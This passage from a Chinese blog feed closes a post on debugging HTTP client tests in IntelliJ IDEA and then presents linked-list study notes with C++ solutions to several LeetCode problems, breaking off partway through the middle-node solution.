data-lazy-src="/posts/34566/897690e446b54dc189f6535d75a4d6a0.jpeg"></p><h5 id="测试调试"><a href="#测试调试" class="headerlink" title="测试调试"></a>测试调试</h5><p>如果想调试测试用例、测试断言，或者想看中间结果，怎么办？</p><p>可以用：client.log函数</p><p>看一下修改后的例子：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/3b1c4027409c45ea952eb75a63af7cdf.jpeg"></p><p>比如：想要看一下GET接口返回的headers信息，可以直接client.log(response.headers)打印结果。上下的两个client.log(“============”)没有实际意义，只是让结果看起来更容易找到。</p><p>像上面提到的那样执行之后，结果在“test”标签页里可以看到：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/27644624f1ef408180c601e688ce5d5e.jpeg"></p><p>执行多次后出现的 json 文件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/aada2feaeb294782999c37567e964b93.jpeg"></p><p>点击右侧的蓝色反向双箭头，可以看到这些json链接的作用是为了让用户可以对比任意两次接口测试结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/e448aeed7a67447fa6f86a86fa2693aa.jpeg"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/d021b4e814d24d7aae0e1152a0a837d7.jpeg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Idea </tag>
            
            <tag> Java </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构学习笔记：链表</title>
      <link href="/posts/26939/"/>
      <url>/posts/26939/</url>
      
        <content type="html"><![CDATA[<h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ul><li><p>null异常处理</p></li><li><p>dummy node 哑巴节点</p></li><li><p>双指针/快慢指针</p></li><li><p>插入一个节点到排序链表</p></li><li><p>从一个链表中移除一个节点</p></li><li><p>翻转链表</p></li><li><p>合并两个链表</p></li><li><p>找到链表的中间节点</p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="83-删除排序链表中的重复元素"><a href="#83-删除排序链表中的重复元素" class="headerlink" title="83. 删除排序链表中的重复元素"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">83. 删除排序链表中的重复元素</a></h4><blockquote><p>给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。</p><p>示例 1:</p><p>输入: 1-&gt;1-&gt;2<br>输出: 1-&gt;2<br>示例 2:</p><p>输入: 1-&gt;1-&gt;2-&gt;3-&gt;3<br>输出: 1-&gt;2-&gt;3</p></blockquote><h5 id="直接法："><a href="#直接法：" class="headerlink" title="直接法："></a><strong>直接法：</strong></h5><p>链表是有序的，所以直接更改当前结点的 next 指针，跳过下一个结点并直接指向下一个结点之后的结点即可。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        ListNode *current=head;</span><br><span class="line">        <span class="comment">//null异常处理</span></span><br><span class="line">        <span class="keyword">while</span>(current!=<span class="literal">NULL</span>&amp;&amp;current-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//一直删除，直到下一个不重复 </span></span><br><span class="line">            <span class="comment">// 想想如果把while改成if怎么样</span></span><br><span class="line">            <span class="comment">//把current-&gt;next!=NULL删除会怎么样</span></span><br><span class="line">            <span class="keyword">while</span>(current-&gt;next!=<span class="literal">NULL</span>&amp;&amp;current-&gt;val==current-&gt;next-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                current-&gt;next=current-&gt;next-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">//移动到下一个节点</span></span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>时间复杂度：O(n)，因为列表中的每个结点都检查一次以确定它是否重复，所以总运行时间为 O(n)，其中 n是列表中的结点数。</p></li><li><p>空间复杂度：O(1)，没有使用额外的空间。</p></li></ul><h4 id="82-删除排序链表中的重复元素-II"><a href="#82-删除排序链表中的重复元素-II" class="headerlink" title="82. 删除排序链表中的重复元素 II"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">82. 删除排序链表中的重复元素 II</a></h4><blockquote><p>给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。</p><p>示例 1:</p><p>输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5<br>输出: 1-&gt;2-&gt;5<br>示例 2:</p><p>输入: 1-&gt;1-&gt;1-&gt;2-&gt;3<br>输出: 2-&gt;3</p></blockquote><h5 id="利用哑结点-："><a href="#利用哑结点-：" class="headerlink" title="利用哑结点 ："></a><strong>利用哑结点</strong> ：</h5><p>为了防止删除头结点的极端情况发生，先创建空结点dummy，使dummy指向传入的head结点。</p><p>然后创建一个cur指针指向dummy，比较cur的后两个结点，看他们是否相同。</p><p>如果相同，则说明cur后有重复元素，此时创建一个temp指针指向第一个重复元素，即cur-&gt;next;</p><p>通过循环进行去重，循环结束后temp指向的是这群重复元素的最后一个，依照题意此时temp的下一个才是我们想要的。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="comment">//设置哑结点 防止删除头结点的情况发生后的问题</span></span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        dummy-&gt;next=head;</span><br><span class="line">        ListNode *cur=dummy;<span class="comment">//cur 指向哑结点</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next!=<span class="literal">NULL</span>&amp;&amp;cur-&gt;next-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//比较cur后两个结点</span></span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;next-&gt;val==cur-&gt;next-&gt;next-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//去重</span></span><br><span class="line">                ListNode *temp=cur-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(temp-&gt;next!=<span class="literal">NULL</span>&amp;&amp;temp-&gt;val==temp-&gt;next-&gt;val)</span><br><span class="line">                {</span><br><span class="line">                    temp=temp-&gt;next;</span><br><span class="line">                }</span><br><span class="line">                <span class="comment">//temp前的重复结点都跳过了，现在我们跳过temp</span></span><br><span class="line">                cur-&gt;next=temp-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//如果cur后两个结点不重复，直接前移</span></span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>时间复杂度：O(n)</p></li><li><p>空间复杂度：O(1)</p></li></ul><h4 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a></h4><blockquote><p>反转一个单链表。</p><p><strong>示例:</strong></p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</p></blockquote><h5 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h5><p>如图，定义两个指针，pre在前 cur在后,temp 保存向前的pre指针的临时指针</p><p>每次进行一次局部翻转，</p><p>当pre到达尾部的时候终止，此时cur指向最后一个节点。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/26939/9ce26a709147ad9ce6152d604efc1cc19a33dc5d467ed2aae5bc68463fdd2888.gif" alt="img"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="comment">/*定义两个指针，pre在前 cur在后</span></span><br><span class="line"><span class="comment">         *当pre到达尾部的时候终止，此时cur指向最后一个节点</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ListNode *pre=head;</span><br><span class="line">        ListNode *cur=<span class="literal">NULL</span>;</span><br><span class="line">        ListNode *temp=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;<span class="comment">//临时存储pre</span></span><br><span class="line">            pre=pre-&gt;next;<span class="comment">//pre指向下一个节点</span></span><br><span class="line">            temp-&gt;next=cur;<span class="comment">//翻转指针</span></span><br><span class="line">            cur=temp;<span class="comment">//cur指针向前移动一步</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="92-反转链表-II"><a href="#92-反转链表-II" class="headerlink" title="92. 反转链表 II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii/">92. 反转链表 II</a></h4><blockquote><p>反转从位置 <em>m</em> 到 <em>n</em> 的链表。请使用一趟扫描完成反转。</p><p><strong>说明:</strong><br>1 ≤ <em>m</em> ≤ <em>n</em> ≤ 链表长度。</p><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">&gt;输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></tbody></table></figure></blockquote><h5 id="迭代法："><a href="#迭代法：" class="headerlink" title="迭代法："></a>迭代法：</h5><p>参考上题，先遍历到 m 处，再翻转</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseBetween</span><span class="params">(ListNode* head, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        ListNode *pre,*cur;</span><br><span class="line">        pre=head;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//遍历到m节点，如果只有一个节点，跳过，这里cur会为空但是后面翻转链表的时候就不是了</span></span><br><span class="line">        <span class="keyword">while</span>(m&gt;<span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            cur=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            m--;</span><br><span class="line">            n--;</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"><span class="comment">//m节点的前一个节点</span></span><br><span class="line">        ListNode*con=cur;</span><br><span class="line">        ListNode*temp=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//用于保存被翻转链表的第一个节点</span></span><br><span class="line">        ListNode*front=pre;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        </span><br><span class="line"><span class="comment">//反转m-n的节点</span></span><br><span class="line">        <span class="keyword">while</span>(n--)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="comment">//如果不只是一个节点，那么就把指针指向被翻转的链表的最后一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(con!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            con-&gt;next=cur;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//否则直接输出此节点</span></span><br><span class="line">            head=cur;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//被翻转的链表原来的头变尾</span></span><br><span class="line">        front-&gt;next=pre;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h4><blockquote><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p>示例：</p><p>输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4<br>输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p></blockquote><h5 id="迭代法：-1"><a href="#迭代法：-1" class="headerlink" title="迭代法："></a>迭代法：</h5><p>直接连接各个节点</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>{</span><br><span class="line"></span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *cur=dummy;</span><br><span class="line">        <span class="comment">//将小的节点接到哑结点为头的链表中</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val&gt;l2-&gt;val)</span><br><span class="line">            {</span><br><span class="line">               cur-&gt;next=l2;</span><br><span class="line">               cur=cur-&gt;next;</span><br><span class="line">               l2=l2-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                cur-&gt;next=l1;</span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//处理剩下的节点</span></span><br><span class="line">        <span class="keyword">if</span>(l1!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            cur-&gt;next=l1;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            cur-&gt;next=l2;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="86-分隔链表"><a href="#86-分隔链表" class="headerlink" title="86. 分隔链表"></a><a href="https://leetcode-cn.com/problems/partition-list/">86. 分隔链表</a></h4><blockquote><p>给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。</p><p>你应当保留两个分区中每个节点的初始相对位置。</p><p>示例:</p><p>输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3<br>输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</p></blockquote><p><strong>当头节点不确定的时候，使用哑巴节点</strong></p><p>将大于 x 的节点，放到另外一个链表，最后连接这两个链表</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">partition</span><span class="params">(ListNode* head, <span class="type">int</span> x)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *headDummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *tailDummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *cur=<span class="literal">NULL</span>,*tail=tailDummy;</span><br><span class="line">        headDummy-&gt;next=head;</span><br><span class="line">        </span><br><span class="line">        head=headDummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next-&gt;val&lt;x)</span><br><span class="line">            {</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">//这里把大于X的节点删除，然后连接到另一个链表</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                cur=head-&gt;next;</span><br><span class="line">                <span class="comment">//删除大于X的节点</span></span><br><span class="line">                head-&gt;next=head-&gt;next-&gt;next;</span><br><span class="line">                <span class="comment">//连接到新链表</span></span><br><span class="line">                tail-&gt;next=cur;</span><br><span class="line">                tail=tail-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//拼接两个链表</span></span><br><span class="line">        <span class="comment">//tail代表tailDummy最后一个节点，它的后面可能还连着，要断掉</span></span><br><span class="line">        <span class="comment">//如输入[1,4,3,2,5,2]就会有错,没有处理5-&gt;2</span></span><br><span class="line">        tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        head-&gt;next=tailDummy-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> headDummy-&gt;next;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876. 链表的中间结点"></a><a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/">876. 链表的中间结点</a></h4><blockquote><p>给定一个带有头结点 <code>head</code> 的非空单链表，返回链表的中间结点。</p><p>如果有两个中间结点，则返回第二个中间结点。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">       {</span><br><span class="line">           slow=slow-&gt;next;</span><br><span class="line">           